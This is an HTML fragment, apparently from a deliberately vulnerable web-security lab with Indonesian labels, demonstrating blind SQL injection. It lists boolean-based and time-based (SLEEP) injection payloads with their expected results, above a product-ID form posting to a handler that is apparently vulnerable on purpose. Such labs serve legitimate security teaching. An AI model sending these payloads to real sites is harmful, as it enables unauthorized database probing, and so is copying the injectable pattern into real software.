<h2>Demo Blind SQLi (Boolean & Time-based)</h2>
<div class="payload-info">
    <p><b>Payload (Boolean TRUE):</b> <code>1' AND 1=1 -- </code> (Hasil: Ditemukan)</p>
    <p><b>Payload (Boolean FALSE):</b> <code>1' AND 1=2 -- </code> (Hasil: Tidak Ditemukan)</p>
    <p><b>Payload (Time-based):</b> <code>1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) -- </code> (Hasil: Halaman akan 'hang' 5 detik)</p>
</div>
<form action="../actions/do_blind_sqli.php" method="POST">
    <div class="form-group">
        <label for="product_id">Cek Ketersediaan ID Produk</label>
        <input type="text" id="product_id" name="product_id" required>
    </div>
    <button type="submit" class="btn btn-danger">Cek</button>
</form>